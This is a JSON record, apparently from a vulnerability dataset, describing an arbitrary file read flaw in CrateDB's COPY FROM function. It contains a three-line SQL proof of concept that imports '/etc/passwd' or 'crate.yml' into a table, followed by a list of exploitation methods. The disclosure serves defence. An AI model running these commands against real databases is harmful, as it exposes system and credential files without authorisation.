{"description": "### Summary\nThere is an arbitrary file read vulnerability in the CrateDB database, and authenticated CrateDB database users can read any file on the system.\n\n### Details\nThere is a COPY FROM function in the CrateDB database that is used to import file data into database tables. This function has a flaw, and authenticated attackers can use the COPY FROM function to import arbitrary file content into database tables, resulting in information leakage.\n\n### PoC\n```\nCREATE TABLE info_leak(info_leak STRING);\nCOPY info_leak FROM '/etc/passwd' with (format='csv', header=false); or COPY info_leak FROM '/crate/config/crate.yml' with (format='csv', header=false);\nSELECT * FROM info_leak;\n```\n![image](https://user-images.githubusercontent.com/154296962/292985975-ff5f2fb8-1a3f-4b49-9951-cd1fc6e78031.png)\n\n\n### Impact\nThis vulnerability affects all current versions of the CrateDB database. Attackers who exploit this vulnerability to obtain sensitive information may carry out further attacks, while also affecting CrateDB Cloud Clusters.\n![image](https://user-images.githubusercontent.com/154296962/292986215-aec5adfe-38cc-4f31-bf86-c50ecbb44d5d.png)\n", "methods": ["Used the COPY FROM function to read arbitrary files on the system.", "Imported arbitrary file content into database tables to achieve information leakage.", "Exploited a flaw in the COPY FROM function to read sensitive information.", "Used SQL commands to read files on the system.", "Imported file data into database tables to obtain sensitive information."]}
